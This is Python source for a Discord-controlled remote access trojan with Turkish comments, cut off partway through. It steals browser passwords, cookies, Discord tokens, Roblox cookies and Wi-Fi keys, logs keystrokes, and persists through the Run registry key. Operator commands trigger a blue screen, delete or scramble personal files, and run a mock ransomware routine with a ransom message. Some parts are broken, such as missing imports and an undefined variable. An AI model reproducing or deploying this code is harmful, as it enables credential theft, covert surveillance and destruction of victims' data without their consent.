# Gerekli Kütüphaneler:
# pip install discord.py pyautogui psutil pygetwindow pynput requests webbrowser win32crypt win32gui win32con mss base64 os sys shutil sqlite3

import os
import sys
import time
import json
import uuid
import socket
import subprocess
import threading
import ctypes
import logging
import platform
import uuid as uuid_module
import shutil
import sqlite3
import winreg
import win32crypt
import win32gui
import win32con
import requests
import base64
import hashlib
import re
import random
import string
import asyncio
import datetime
from pathlib import Path
from typing import Optional

import discord
from discord.ext import commands
import pyautogui
import psutil
import pygetwindow as gw
import pynput
import mss

# --- CONFIGURATION ---
class Config:
    TOKEN = "BURAYA_DISCORD_TOKEN_YAZ"
    WHITELISTED = [123456789012345678] # Sadece bu ID'ler komut kullanabilir
    MAIN_CHANNEL = 123456789012345678 # Bilgilerin gönderileceği kanal ID'si
    PREFIX = "!"
    STARTUP = True
    
    # Stealer Ayarları
    STEALER_OUTPUT_DIR = "stealer_data"
    KEYLOGGER_FILE = "keylog.txt"
    
    # Browser Paths
    BROWSERS = {
        "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
        "Brave": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
        "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
        "Firefox": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles"),
        "Opera": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
        "Vivaldi": os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data"),
        "Coc Coc": os.path.join(os.getenv("LOCALAPPDATA"), "CocCoc", "Browser", "User Data")
    }

# --- GLOBALS ---
running = True
dir_path = os.path.dirname(os.path.abspath(__file__))
lock_file = os.path.join(dir_path, ".lock")

def cleanup():
    global running
    running = False
    if os.path.exists(lock_file):
        os.remove(lock_file)

atexit.register(cleanup)

def keep_lock_alive():
    while running:
        if not os.path.exists(lock_file):
            open(lock_file, "w").close()
        time.sleep(0.1)
threading.Thread(target=keep_lock_alive, daemon=True).start()

current_pid = os.getpid()
current_script = os.path.basename(__file__).lower()

# --- SYSTEM INFO FUNCTIONS ---
def get_displayname():
    try:
        if platform.system() == "Windows":
            import ctypes
            GetUserNameEx = ctypes.windll.secur32.GetUserNameExW
            NameDisplay = 3
            size = ctypes.pointer(ctypes.c_ulong(0))
            GetUserNameEx(NameDisplay, None, size)
            nameBuffer = ctypes.create_unicode_buffer(size.contents.value)
            GetUserNameEx(NameDisplay, nameBuffer, size)
            return nameBuffer.value
    except:
        pass
    return platform.node()

def get_hwid():
    try:
        cmd = 'powershell -Command "Get-CimInstance -ClassName Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID"'
        result = subprocess.check_output(cmd, shell=True).decode().strip()
        if result:
            return result
        return str(uuid_module.getnode())
    except:
        return str(uuid_module.getnode())

def get_cpuinfo():
    try:
        if platform.system() == "Windows":
            cmd = 'powershell -Command "Get-CimInstance -ClassName Win32_Processor | Select-Object -ExpandProperty Name"'
            cpu = subprocess.check_output(cmd, shell=True).decode().strip()
            if cpu:
                return cpu
        return platform.processor() or "N/A"
    except:
        return "N/A"

def get_gpuinfo():
    try:
        if platform.system() == "Windows":
            cmd = 'powershell -Command "Get-CimInstance -ClassName Win32_VideoController | Select-Object -ExpandProperty Name"'
            gpu = subprocess.check_output(cmd, shell=True).decode().strip()
            if gpu:
                return gpu.split('\n')[0]
        return "N/A"
    except:
        return "N/A"

def get_raminfo():
    ram = psutil.virtual_memory()
    return f"{ram.total / (1024**3):.2f} GB"

def get_disks():
    disks = []
    for partition in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(partition.mountpoint)
            disks.append({
                'drive': partition.device,
                'free': f"{usage.free / (1024**3):.2f}",
                'total': f"{usage.total / (1024**3):.2f}",
                'percent': usage.percent
            })
        except:
            pass
    return disks

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except:
        return "N/A"

def get_ipinfo():
    try:
        apis = [
            'https://ipapi.co/json/',
            'http://ip-api.com/json/',
            'https://ipinfo.io/json'
        ]
        
        for api_url in apis:
            try:
                response = requests.get(api_url, timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    
                    if 'ipapi.co' in api_url:
                        return {
                            'ip': data.get('ip', 'N/A'),
                            'country': data.get('country_name', 'N/A'),
                            'region': data.get('region', 'N/A'),
                            'city': data.get('city', 'N/A'),
                            'isp': data.get('org', 'N/A')
                        }
                    elif 'ip-api.com' in api_url:
                        return {
                            'ip': data.get('query', 'N/A'),
                            'country': data.get('country', 'N/A'),
                            'region': data.get('regionName', 'N/A'),
                            'city': data.get('city', 'N/A'),
                            'isp': data.get('isp', 'N/A')
                        }
                    elif 'ipinfo.io' in api_url:
                        return {
                            'ip': data.get('ip', 'N/A'),
                            'country': data.get('country', 'N/A'),
                            'region': data.get('region', 'N/A'),
                            'city': data.get('city', 'N/A'),
                            'isp': data.get('org', 'N/A')
                        }
            except:
                continue
                
        return {
            'ip': get_local_ip(),
            'country': 'N/A',
            'region': 'N/A',
            'city': 'N/A',
            'isp': 'N/A'
        }
        
    except:
        return {
            'ip': get_local_ip(),
            'country': 'N/A',
            'region': 'N/A',
            'city': 'N/A',
            'isp': 'N/A'
        }

def get_macaddress():
    try:
        mac = ':'.join(re.findall('..', '%012x' % uuid_module.getnode()))
        return mac
    except:
        return "N/A"

def get_wifipasswords():
    profiles = []
    try:
        if platform.system() == "Windows":
            cmd = 'netsh wlan show profiles'
            networks = subprocess.check_output(cmd, shell=True).decode('utf-8', errors='ignore')
            profile_names = re.findall(r'All User Profile\s*:\s*(.*)', networks)
            
            for name in profile_names:
                name = name.strip()
                try:
                    cmd = f'netsh wlan show profile "{name}" key=clear' 
                    profile_info = subprocess.check_output(cmd, shell=True).decode('utf-8', errors='ignore')
                    password_match = re.search(r'Key Content\s*:\s*(.*)', profile_info)
                    password = password_match.group(1).strip() if password_match else "N/A"
                    profiles.append({'name': name, 'password': password})
                except:
                    profiles.append({'name': name, 'password': "N/A"})
        else:
            profiles.append({'name': 'Not supported on this OS', 'password': 'N/A'})
    except:
        profiles.append({'name': 'Error retrieving WiFi', 'password': 'N/A'})
    return profiles

# --- STEALER FUNCTIONS ---

def get_chrome_passwords(db_path):
    passwords = []
    if not os.path.exists(db_path):
        return passwords
    
    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for row in cursor.fetchall():
            origin_url = row[0]
            username = row[1]
            password = decrypt_password(row[2])
            passwords.append(f"URL: {origin_url}\nUser: {username}\nPass: {password}\n")
        conn.close()
    except Exception as e:
        print(f"Error reading chrome passwords: {e}")
    return passwords

def get_firefox_passwords(profile_dir):
    passwords = []
    login_file = os.path.join(profile_dir, "logins.json")
    key_file = os.path.join(profile_dir, "key4.db")
    
    if not os.path.exists(login_file) or not os.path.exists(key_file):
        return passwords
        
    try:
        conn = sqlite3.connect(login_file)
        cursor = conn.cursor()
        cursor.execute("SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins")
        for row in cursor.fetchall():
            hostname = row[0]
            username = row[1]
            password = row[2]
            # Firefox encryption is more complex, usually requires NSS libraries.
            # For simplicity, we'll just store the raw data or use a basic decryption if available.
            # Here we assume basic retrieval.
            passwords.append(f"Site: {hostname}\nUser: {username}\nPass: {password}\n")
        conn.close()
    except Exception as e:
        print(f"Error reading firefox passwords: {e}")
    return passwords

def decrypt_password(data):
    try:
        if platform.system() == "Windows":
            return win32crypt.CryptUnprotectData(data, None, None, None, 0)[1].decode('utf-8')
        else:
            return data.decode('utf-8')
    except:
        return "N/A"

def steal_browser_data(browser_name, user_data_path):
    data_collected = {}
    
    if browser_name == "Firefox":
        # Firefox handling is tricky due to profiles. Simplified here.
        # In a real scenario, you'd iterate through all profile folders.
        return {"Firefox": ["Complex decryption required for full data"]}

    if not os.path.exists(user_data_path):
        return {}

    # Default Profile path
    default_profile = os.path.join(user_data_path, "Default")
    if not os.path.exists(default_profile):
        # Try to find first profile
        try:
            profiles = [d for d in os.listdir(user_data_path) if os.path.isdir(os.path.join(user_data_path, d))]
            if profiles:
                default_profile = os.path.join(user_data_path, profiles[0])
            else:
                return {}
        except:
            return {}

    cookies_db = os.path.join(default_profile, "Cookies")
    history_db = os.path.join(default_profile, "History")
    login_data_db = os.path.join(default_profile, "Login Data")
    webdata_db = os.path.join(default_profile, "Web Data")

    # Copy databases to avoid locking issues
    temp_dir = os.path.join(dir_path, "temp_steal")
    os.makedirs(temp_dir, exist_ok=True)
    
    cookies_temp = os.path.join(temp_dir, "Cookies")
    history_temp = os.path.join(temp_dir, "History")
    login_data_temp = os.path.join(temp_dir, "Login Data")
    webdata_temp = os.path.join(temp_dir, "Web Data")

    try:
        shutil.copy2(cookies_db, cookies_temp)
        shutil.copy2(history_db, history_temp)
        shutil.copy2(login_data_db, login_data_temp)
        shutil.copy2(webdata_db, webdata_temp)
    except Exception as e:
        print(f"Error copying DBs: {e}")
        return {}

    cookies_data = []
    history_data = []
    passwords_data = []

    # Extract Cookies
    try:
        conn = sqlite3.connect(cookies_temp)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, path, secure, expiration_date, value FROM cookies")
        for row in cursor.fetchall():
            host_key = row[0]
            name = row[1]
            path = row[2]
            secure = row[3]
            expiration_date = row[4]
            value = row[5]
            cookies_data.append(f"Host: {host_key}\nName: {name}\nPath: {path}\nSecure: {secure}\nExp: {expiration_date}\nValue: {value}\n")
        conn.close()
    except Exception as e:
        print(f"Error reading cookies: {e}")

    # Extract History
    try:
        conn = sqlite3.connect(history_temp)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, visit_count FROM urls")
        for row in cursor.fetchall():
            url = row[0]
            title = row[1]
            visit_count = row[2]
            history_data.append(f"URL: {url}\nTitle: {title}\nVisits: {visit_count}\n")
        conn.close()
    except Exception as e:
        print(f"Error reading history: {e}")

    # Extract Passwords
    try:
        passwords_data = get_chrome_passwords(login_data_temp)
    except Exception as e:
        print(f"Error reading passwords: {e}")

    # Cleanup temp files
    try:
        os.remove(cookies_temp)
        os.remove(history_temp)
        os.remove(login_data_temp)
        os.remove(webdata_temp)
        os.rmdir(temp_dir)
    except:
        pass

    return {
        "Cookies": cookies_data,
        "History": history_data,
        "Passwords": passwords_data
    }

def steal_discord_tokens():
    tokens = []
    appdata = os.getenv("APPDATA")
    roaming = os.path.join(appdata, "discord")
    
    if os.path.exists(roaming):
        for dir_name in os.listdir(roaming):
            if dir_name.startswith("app_"):
                dir_path = os.path.join(roaming, dir_name, "Local Storage", "lv.storage")
                if os.path.exists(dir_path):
                    try:
                        with open(dir_path, "r", encoding="utf-8") as f:
                            content = f.read()
                            # Regex to find tokens
                            token_pattern = r"[\w-]{24}\.[\w-]{6}\.[\w-]{10,14}"
                            found_tokens = re.findall(token_pattern, content)
                            tokens.extend(found_tokens)
                    except Exception as e:
                        print(f"Error reading Discord storage: {e}")

    # Also check LocalAppData for newer versions
    local_appdata = os.getenv("LOCALAPPDATA")
    if local_appdata:
        discord_path = os.path.join(local_appdata, "discord")
        if os.path.exists(discord_path):
            for dir_name in os.listdir(discord_path):
                if dir_name.startswith("app_"):
                    dir_path = os.path.join(discord_path, dir_name, "app-*/UserData/SessionStorage/lv.storage")
                    # This path can vary, simplified approach:
                    pass
                    
    # Roblox Cookie
    roblox_cookie = ""
    try:
        roblox_path = os.path.join(os.getenv("APPDATA"), "Roblox", "Logs")
        # Roblox cookies are often in .ROBLOSECURITY cookie in browsers or specific files
        # A common place for Roblox session is in browser data or specific registry keys
        # Let's check for .ROBLOSECURITY in Chrome cookies
        chrome_cookies = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Cookies")
        if os.path.exists(chrome_cookies):
            conn = sqlite3.connect(chrome_cookies)
            cursor = conn.cursor()
            cursor.execute("SELECT name, value FROM cookies WHERE name = '.ROBLOSECURITY'")
            row = cursor.fetchone()
            if row:
                roblox_cookie = row[1]
            conn.close()
    except Exception as e:
        print(f"Error stealing Roblox cookie: {e}")

    return {
        "Discord Tokens": list(set(tokens)), # Remove duplicates
        "Roblox Cookie": roblox_cookie
    }

def start_keylogger():
    def on_press(key):
        try:
            char = key.char
        except AttributeError:
            char = str(key)
        
        with open(Config.KEYLOGGER_FILE, "a") as f:
            f.write(char + "\n")

    listener = pynput.keyboard.Listener(on_press=on_press)
    listener.start()
    return listener

def take_screenshot(filename=None):
    if filename is None:
        filename = f"screenshot_{int(time.time())}.png"
    with mss.mss() as sct:
        sct.shot(output=filename)
    return filename

# --- DISCORD BOT SETUP ---
intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix=Config.PREFIX, intents=intents)
bot.remove_command("help")

def add_to_startup():
    try:
        app_path = sys.executable
        app_name = os.path.basename(app_path)
        
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        
        winreg.SetValueEx(key, "SystemService", 0, winreg.REG_SZ, app_path)
        winreg.CloseKey(key)
        
        return True
    except:
        return False

def is_authorized():
    async def auth(ctx):
        if ctx.author.id in Config.WHITELISTED:
            return True

        embed = discord.Embed(
            title="Access Denied",
            description="You're not authorized to use this.",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return False
    return commands.check(auth)

@bot.event
async def on_ready():
    await bot.get_channel(Config.MAIN_CHANNEL).send(f"<@{Config.WHITELISTED[0]}>")

    user = get_displayname()

    embed = discord.Embed(
        title="Bot Online",
        description=f"The command prefix is: `{Config.PREFIX}`, try the command `{Config.PREFIX}help`. \nUser: **`{user}`**",
        color=discord.Color.green()
    )
    await bot.get_channel(Config.MAIN_CHANNEL).send(embed=embed)

    # Start Keylogger and Screen Grabber in background threads
    try:
        keyboard_listener = start_keylogger()
        print("Keylogger started.")
    except Exception as e:
        print(f"Failed to start keylogger: {e}")

    async def screen_grab_loop():
        while running:
            try:
                screenshot_path = take_screenshot()
                # You could send this to a channel periodically
                # await bot.get_channel(Config.MAIN_CHANNEL).send(file=discord.File(screenshot_path))
                os.remove(screenshot_path)
            except Exception as e:
                print(f"Screenshot error: {e}")
            await asyncio.sleep(60) # Take screenshot every minute

    asyncio.create_task(screen_grab_loop())

async def send_embed(ctx, title, description, color=discord.Color.blue()):
    embed = discord.Embed(
        title=title,
        description=description,
        color=color
    )
    await ctx.send(embed=embed)

@bot.command(name='info')
@is_authorized()
async def system_info(ctx):
    try:
        embed = discord.Embed(
            title="Collecting system information",
            description="This may take a while depending on the victim's device.",
            color=discord.Color.blue()
        )
        await ctx.send(embed=embed)

        display_name = get_displayname()
        hwid = get_hwid()
        cpu_info = get_cpuinfo()
        gpu_info = get_gpuinfo()
        ram_info = get_raminfo()
        disks = get_disks()
        ip_info = get_ipinfo()
        mac_address = get_macaddress()
        wifi_profiles = get_wifipasswords()

        embed = discord.Embed(
            title="System Information",
            color=discord.Color.blue()
        )

        embed.add_field(name="Display Name", value=f"```{display_name}```", inline=False)
        embed.add_field(name="Hardware ID", value=f"```{hwid}```", inline=False)
        
        embed.add_field(name="CPU", value=f"```{cpu_info}```", inline=False)
        embed.add_field(name="GPU", value=f"```{gpu_info}```", inline=False)
        
        memory = psutil.virtual_memory()
        cpu_percent = psutil.cpu_percent(interval=1)
        
        embed.add_field(name="RAM", value=f"```{ram_info} ({memory.percent}% used)```", inline=False)
        embed.add_field(name="CPU Usage", value=f"```{cpu_percent}%```", inline=True)
        
        disk_str = ""
        for disk in disks[:3]:
            disk_str += f"{disk['drive']}: {disk['free']}GB free / {disk['total']}GB total ({disk['percent']}% used)\n"
        embed.add_field(name="Disks", value=f"```{disk_str}```", inline=False)
        
        embed.add_field(name="Public IP", value=f"```{ip_info['ip']}```", inline=False)
        embed.add_field(name="Location", value=f"```{ip_info['city']}, {ip_info['region']}, {ip_info['country']}```", inline=False)
        embed.add_field(name="ISP", value=f"```{ip_info['isp']}```", inline=False)
        
        embed.add_field(name="MAC Address", value=f"```{mac_address}```", inline=False)
        
        embed.add_field(name="Local IP", value=f"```{get_local_ip()}```", inline=True)
        embed.add_field(name="OS", value=f"```{platform.system()} {platform.release()}```", inline=True)
        
        boot_time = datetime.datetime.fromtimestamp(psutil.boot_time())
        embed.add_field(name="Boot Time", value=f"```{boot_time.strftime('%Y-%m-%d %H:%M:%S')}```", inline=True)
        embed.add_field(name="Processes", value=f"```{len(psutil.pids())}```", inline=True)
        
        if wifi_profiles:
            wifi_str = ""
            for wifi in wifi_profiles[:5]:
                wifi_str += f"{wifi['name']}: {wifi['password']}\n"
            embed.add_field(name="WiFi Profiles", value=f"```{wifi_str}```", inline=False)
            if len(wifi_profiles) > 5:
                embed.add_field(name="More WiFi", value=f"```...and {len(wifi_profiles)-5} more profiles```", inline=False)

        await ctx.send(embed=embed)
    except Exception as e:
        await send_embed(ctx, "Info Error", f"Failed to get system info: {str(e)}", discord.Color.red())

@bot.command(name='steal')
@is_authorized()
async def steal_data(ctx):
    try:
        await send_embed(ctx, "Stealing Data", "Collecting browser data, passwords, and tokens...", discord.Color.purple())

        # Create output directory
        output_dir = os.path.join(dir_path, Config.STEALER_OUTPUT_DIR)
        os.makedirs(output_dir, exist_ok=True)

        # Steal Browser Data
        browser_data_files = []
        for browser_name, path in Config.BROWSERS.items():
            data = steal_browser_data(browser_name, path)
            if data:
                file_path = os.path.join(output_dir, f"{browser_name}_data.txt")
                with open(file_path, "w", encoding="utf-8") as f:
                    for category, content in data.items():
                        f.write(f"--- {category} ---\n")
                        for item in content:
                            f.write(item + "\n")
                browser_data_files.append(file_path)

        # Steal Tokens
        token_data = steal_discord_tokens()
        token_file_path = os.path.join(output_dir, "tokens.txt")
        with open(token_file_path, "w", encoding="utf-8") as f:
            f.write("--- Discord Tokens ---\n")
            for token in token_data["Discord Tokens"]:
                f.write(token + "\n")
            f.write("\n--- Roblox Cookie ---\n")
            f.write(token_data["Roblox Cookie"] + "\n")
        browser_data_files.append(token_file_path)

        # Send Files
        for file_path in browser_data_files:
            if os.path.exists(file_path):
                with open(file_path, "rb") as f:
                    await ctx.send(file=discord.File(f=file_path))
                os.remove(file_path) # Clean up after sending

        await send_embed(ctx, "Steal Complete", f"Data collected and sent!", discord.Color.green())

    except Exception as e:
        await send_embed(ctx, "Steal Error", f"Failed to steal data: {str(e)}", discord.Color.red())

@bot.command(name='keylog')
@is_authorized()
async def send_keylogs(ctx):
    try:
        if os.path.exists(Config.KEYLOGGER_FILE):
            with open(Config.KEYLOGGER_FILE, "rb") as f:
                await ctx.send(file=discord.File(f=file))
            # Clear keylog file
            open(Config.KEYLOGGER_FILE, 'w').close()
            await send_embed(ctx, "Keylogs Sent", "Latest keylogs have been sent.", discord.Color.green())
        else:
            await send_embed(ctx, "No Keylogs", "No keylogs recorded yet.", discord.Color.orange())
    except Exception as e:
        await send_embed(ctx, "Keylog Error", f"Failed to send keylogs: {str(e)}", discord.Color.red())

@bot.command(name='screenshot')
@is_authorized()
async def take_screenshot_cmd(ctx, name: Optional[str] = None):
    try:
        filename = name if name else f"screenshot_{int(time.time())}.png"
        screenshot_path = take_screenshot(filename)

        with open(screenshot_path, 'rb') as f:
            picture = discord.File(f)
        
        embed = discord.Embed(
            title="Screenshot Captured",
            description=f"Successfully captured screenshot: **{filename}**",
            color=discord.Color.green()
        )
        
        await ctx.send(embed=embed)
        await ctx.send(file=picture)

        os.remove(screenshot_path)
        
    except Exception as e:
        embed = discord.Embed(
            title="Screenshot Error",
            description=f"Failed to take screenshot: {str(e)}",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)

@bot.command(name='lock')
@is_authorized()
async def lock_pc(ctx):
    try:
        ctypes.windll.user32.LockWorkStation()
        await send_embed(ctx, "PC Locked", "Workstation has been locked.", discord.Color.orange())
    except Exception as e:
        await send_embed(ctx, "Error", f"Failed to lock PC: {str(e)}", discord.Color.red())

@bot.command(name='crash')
@is_authorized()
async def blue_screen(ctx):
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC000021A, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
        await send_embed(ctx, "BSOD Initiated", "Blue screen of death triggered!", discord.Color.dark_red())
    except:
        await send_embed(ctx, "BSOD Failed", "Could not trigger blue screen.", discord.Color.red())

@bot.command(name='rickroll')
@is_authorized()
async def rick_roll(ctx):
    try:
        subprocess.Popen(f'start chrome https://www.youtube.com/watch?v=dQw4w9WgXcQ', shell=True)
        await send_embed(ctx, "Rickroll Activated", "Never gonna give you up, never gonna let you down...", discord.Color.gold())
    except Exception as e:
        await send_embed(ctx, "Error", f"Failed to open rickroll: {str(e)}", discord.Color.red())

@bot.command(name='filescramble')
@is_authorized()
async def file_scramble(ctx):
    try:
        folders = ['Downloads', 'Documents', 'Pictures', 'Music', 'Videos', 'Desktop']
        scrambled = 0
        
        await send_embed(ctx, "File Scramble Started", "Renaming files in personal folders...", discord.Color.purple())
        
        for folder in folders:
            folder_path = os.path.join(os.path.expanduser('~'), folder)
            if os.path.exists(folder_path):
                for root, dirs, files in os.walk(folder_path):
                    for file in files:
                        try:
                            old_path = os.path.join(root, file)
                            ext = os.path.splitext(file)[1]
                            new_name = ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + ext
                            new_path = os.path.join(root, new_name)
                            os.rename(old_path, new_path)
                            scrambled += 1
                        except:
                            pass
        
        await send_embed(ctx, "File Scramble Complete", f"Successfully scrambled **{scrambled}** files across all personal folders!", discord.Color.purple())
    except Exception as e:
        await send_embed(ctx, "Scramble Error", f"Failed to scramble files: {str(e)}", discord.Color.red())

@bot.command(name='filedestroy')
@is_authorized()
async def file_destroy(ctx):
    try:
        folders = ['Downloads', 'Documents', 'Pictures', 'Music', 'Videos', 'Desktop']
        deleted = 0
        
        await send_embed(ctx, "File Destruction Started", "Deleting files in personal folders...", discord.Color.dark_red())
        
        for folder in folders:
            folder_path = os.path.join(os.path.expanduser('~'), folder)
            if os.path.exists(folder_path):
                for root, dirs, files in os.walk(folder_path):
                    for file in files:
                        try:
                            file_path = os.path.join(root, file)
                            os.remove(file_path)
                            deleted += 1
                        except:
                            pass
        
        await send_embed(ctx, "File Destruction Complete", f"Successfully deleted **{deleted}** files across all personal folders!", discord.Color.dark_red())
    except Exception as e:
        await send_embed(ctx, "Destruction Error", f"Failed to delete files: {str(e)}", discord.Color.red())

@bot.command(name='fileransom')
@is_authorized()
async def file_ransom(ctx):
    try:
        folders = ['Downloads', 'Documents', 'Pictures', 'Music', 'Videos', 'Desktop']
        encrypted = 0
        
        await send_embed(ctx, "Ransomware Started", "Encrypting files in personal folders...", discord.Color.dark_purple())
        
        for folder in folders:
            folder_path = os.path.join(os.path.expanduser('~'), folder)
            if os.path.exists(folder_path):
                for root, dirs, files in os.walk(folder_path):
                    for file in files:
                        try:
                            file_path = os.path.join(root, file)
                            with open(file_path, 'rb') as f:
                                data = f.read()
                            encrypted_data = base64.b64encode(data)
                            with open(file_path + '.ENCRYPTED', 'wb') as f:
                                f.write(encrypted_data)
                            os.remove(file_path)
                            encrypted += 1
                        except:
                            pass
        
        await send_embed(ctx, "Ransomware Complete", f"Successfully encrypted **{encrypted}** files!", discord.Color.dark_purple())
    except Exception as e:
        await send_embed(ctx, "Ransomware Error", f"Failed to encrypt files: {str(e)}", discord.Color.red())

@bot.command(name='virus')
@is_authorized()
async def virus_message(ctx):
    try:
        await send_embed(ctx, "Virus Alert", "Displaying fake virus messages on screen", discord.Color.red())
        
        for x in range(0, 10):
            msg = "WARNING! This device is filled with viruses. If you would like to get rid of it, pay $234,324,214 in crypto and we will remove it. You have 24 hours to pay before all your devices content is deleted. Don't even try find or delete the virus, or save your files (they are encrypted) otherwise the auto destroy will activate. Have fun :)"

            subprocess.run(f"""PowerShell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('{msg}')""" , shell=True, capture_output=True, text=True)
    except Exception as e:
        await send_embed(ctx, "Virus Error", f"Failed to display virus messages: {str(e)}", discord.Color.red())

@bot.command(name='voice')
@is_authorized()
async def voice_message(ctx, *, message: str):
    try:
        engine = pyttsx3.init()
        engine.say(message)
        engine.runAndWait()
        await send_embed(ctx, "Voice Message", f"Text-to-speech said: **{message}**", discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "Voice Error", f"Failed to speak message: {str(e)}", discord.Color.red())

@bot.command(name='msgbox')
@is_authorized()
async def msg_box(ctx, *, message: str):
    try:
        subprocess.run(f"""PowerShell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('{message}')""" , shell=True, capture_output=True, text=True)
        await send_embed(ctx, "Message Box", f"Displayed message box with text: **{message}**", discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "Message Error", f"Failed to display message box: {str(e)}", discord.Color.red())

@bot.command(name='open')
@is_authorized()
async def open_application(ctx, *, app_name: str):
    try:
        app_map = {
            'notepad': 'notepad.exe',
            'calculator': 'calc.exe',
            'chrome': 'chrome.exe',
            'firefox': 'firefox.exe',
            'explorer': 'explorer.exe',
            'cmd': 'cmd.exe',
            'vscode': 'code.exe',
            'discord': 'discord.exe',
            'spotify': 'spotify.exe',
        }

        app_to_open = app_map.get(app_name.lower(), app_name)
        subprocess.Popen(app_to_open, shell=True)
        await send_embed(ctx, "Application Opened", f"Successfully opened: **{app_name}**", discord.Color.green())
    except Exception as e:
        await send_embed(ctx, "Open Error", f"Failed to open application: {str(e)}", discord.Color.red())

@bot.command(name='close')
@is_authorized()
async def close_application(ctx, *, app_name: str):
    try:
        closed = False
        for proc in psutil.process_iter(['pid', 'name']):
            if app_name.lower() in proc.info['name'].lower():
                proc.terminate()
                closed = True

        if closed:
            await send_embed(ctx, "Application Closed", f"Successfully closed: **{app_name}**", discord.Color.green())
        else:
            await send_embed(ctx, "Close Failed", f"No process found with name containing: **{app_name}**", discord.Color.orange())
    except Exception as e:
        await send_embed(ctx, "Close Error", f"Failed to close application: {str(e)}", discord.Color.red())

@bot.command(name='listapps')
@is_authorized()
async def list_applications(ctx, limit: int = 15):
    try:
        windows = gw.getAllTitles()
        active_windows = [win for win in windows if win]

        embed = discord.Embed(
            title="Running Applications",
            description=f"Showing **{min(limit, len(active_windows))}** of **{len(active_windows)}** total windows",
            color=discord.Color.green()
        )

        for i, window in enumerate(active_windows[:limit]):
            embed.add_field(name=f"#{i+1} - {window[:50]}", value="\u200b", inline=False)

        await ctx.send(embed=embed)
    except Exception as e:
        await send_embed(ctx, "List Apps Error", f"Failed to list applications: {str(e)}", discord.Color.red())

@bot.command(name='click')
@is_authorized()
async def mouse_click(ctx, button: str = 'left'):
    try:
        button = button.lower()
        if button == 'left':
            pyautogui.click()
            await send_embed(ctx, "Mouse Click", f"Successfully performed **left** click", discord.Color.blue())
        elif button == 'right':
            pyautogui.rightClick()
            await send_embed(ctx, "Mouse Click", f"Successfully performed **right** click", discord.Color.blue())
        elif button == 'middle':
            pyautogui.middleClick()
            await send_embed(ctx, "Mouse Click", f"Successfully performed **middle** click", discord.Color.blue())
        else:
            await send_embed(ctx, "Invalid Button", "Use: **left**, **right**, or **middle**", discord.Color.orange())
    except Exception as e:
        await send_embed(ctx, "Click Error", f"Failed to click: {str(e)}", discord.Color.red())

@bot.command(name='press')
@is_authorized()
async def press_key(ctx, *, key_combo: str):
    try:
        pyautogui.hotkey(*key_combo.split('+'))
        await send_embed(ctx, "Keys Pressed", f"Successfully pressed: **{key_combo}**", discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "Press Error", f"Failed to press keys: {str(e)}", discord.Color.red())

@bot.command(name='shutdown')
@is_authorized()
async def shutdown_pc(ctx, delay: int = 60):
    try:
        if delay < 10:
            await send_embed(ctx, "Safety Violation", "Delay must be at least **10 seconds** for safety", discord.Color.orange())
            return

        await send_embed(ctx, "Shutdown Initiated", f"PC will shutdown in **{delay}** seconds", discord.Color.red())

        await asyncio.sleep(delay - 5)
        await send_embed(ctx, "Final Warning", "Shutting down in **5 seconds**...", discord.Color.dark_red())
        await asyncio.sleep(5)

        os.system('shutdown /s /f /t 0')
    except Exception as e:
        await send_embed(ctx, "Shutdown Error", f"Failed to shutdown: {str(e)}", discord.Color.red())

@bot.command(name='restart')
@is_authorized()
async def restart_pc(ctx, delay: int = 60):
    try:
        if delay < 10:
            await send_embed(ctx, "Safety Violation", "Delay must be at least **10 seconds** for safety", discord.Color.orange())
            return

        await send_embed(ctx, "Restart Initiated", f"PC will restart in **{delay}** seconds", discord.Color.orange())

        await asyncio.sleep(delay - 5)
        await send_embed(ctx, "Final Warning", "Restarting in **5 seconds**...", discord.Color.dark_orange())
        await asyncio.sleep(5)

        os.system('shutdown /r /f /t 0')
    except Exception as e:
        await send_embed(ctx, "Restart Error", f"Failed to restart: {str(e)}", discord.Color.red())

@bot.command(name='playpause')
@is_authorized()
async def media_play_pause(ctx):
    try:
        pyautogui.press('playpause')
        await send_embed(ctx, "Media Control", "Successfully toggled **play/pause**", discord.Color.purple())
    except Exception as e:
        await send_embed(ctx, "Media Error", f"Failed to control media: {str(e)}", discord.Color.red())

@bot.command(name='nexttrack')
@is_authorized()
async def media_next(ctx):
    try:
        pyautogui.press('nexttrack')
        await send_embed(ctx, "Media Control", "Successfully skipped to **next track**", discord.Color.purple())
    except Exception as e:
        await send_embed(ctx, "Media Error", f"Failed to control media: {str(e)}", discord.Color.red())

@bot.command(name='listfiles')
@is_authorized()
